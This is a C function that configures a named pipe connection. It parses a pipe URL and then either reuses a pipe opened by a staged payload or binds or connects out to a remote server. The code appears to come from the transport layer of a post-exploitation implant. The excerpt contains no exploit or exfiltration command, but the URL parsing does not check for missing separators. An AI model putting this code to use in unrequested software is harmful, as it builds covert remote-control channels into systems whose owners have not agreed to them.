/*!
 * @brief Configure the named pipe connnection. If it doesn't exist, go ahead and estbalish it.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static BOOL configure_named_pipe_connection(Transport* transport)
{
	DWORD result = ERROR_SUCCESS;
	wchar_t tempUrl[512];
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)transport->ctx;

	if (ctx->pipe_name == NULL)
	{
		dprintf("[NP CONFIGURE] Url: %S", transport->url);
		wcscpy_s(tempUrl, 512, transport->url);
		dprintf("[NP CONFIGURE] Copied: %S", tempUrl);

		transport->comms_last_packet = current_unix_timestamp();

		dprintf("[NP CONFIGURE] Making sure it's a pipe ...");
		if (wcsncmp(tempUrl, L"pipe", 4) == 0)
		{
			dprintf("[NP CONFIGURE] Yup, it is, parsing");
			wchar_t* pServer = wcsstr(tempUrl, L"//") + 2;
			dprintf("[NP CONFIGURE] pServer is %p", pServer);
			dprintf("[NP CONFIGURE] pServer is %S", pServer);
			wchar_t* pName = wcschr(pServer, L'/') + 1;
			dprintf("[NP CONFIGURE] pName is %p", pName);
			dprintf("[NP CONFIGURE] pName is %S", pName);
			wchar_t* pSlash = wcschr(pName, L'/');
			dprintf("[NP CONFIGURE] pName is %p", pName);

			// Kill off a trailing slash if there is one
			if (pSlash != NULL)
			{
				*pSlash = '\0';
			}

			*(pName - 1) = '\0';

			dprintf("[NP CONFIGURE] Server: %S", pServer);
			dprintf("[NP CONFIGURE] Name: %S", pName);

			size_t requiredSize = wcslen(pServer) + wcslen(pName) + 9;
			ctx->pipe_name = (STRTYPE)calloc(requiredSize, sizeof(CHARTYPE));
			_snwprintf_s(ctx->pipe_name, requiredSize, requiredSize - 1, L"\\\\%s\\pipe\\%s", pServer, pName);
			dprintf("[NP CONFIGURE] Full pipe name: %S", ctx->pipe_name);
		}
	}


	// check if comms is already open via a staged payload
	if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
	{
		// Configure PIPE_WAIT. Stager doesn't do this because ConnectNamedPipe may never return.
		DWORD mode = 0;
		SetNamedPipeHandleState((HANDLE)ctx->pipe, &mode, NULL, NULL);
		dprintf("[NP] Connection already running on %u", ctx->pipe);
	}
	else
	{
		dprintf("[NP CONFIGURE] pipe name is %p", ctx->pipe_name);

		if (ctx->pipe_name != NULL)
		{
			if (wcsncmp(ctx->pipe_name, L"\\\\.\\", 4) == 0)
			{
				ctx->pipe = bind_named_pipe(ctx->pipe_name, &transport->timeouts);
			}
			else
			{
				ctx->pipe = reverse_named_pipe(ctx->pipe_name, &transport->timeouts);
			}
		}
		else
		{
			dprintf("[NP] we might have had an invalid URL");
			result = ERROR_INVALID_PARAMETER;
		}
	}

	if (ctx->pipe == INVALID_HANDLE_VALUE)
	{
		dprintf("[SERVER] Something went wrong");
		return FALSE;
	}

	dprintf("[SERVER] Looking good, FORWARD!");

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->pipe, HANDLE_FLAG_INHERIT, 0);

	transport->comms_last_packet = current_unix_timestamp();

	return TRUE;
}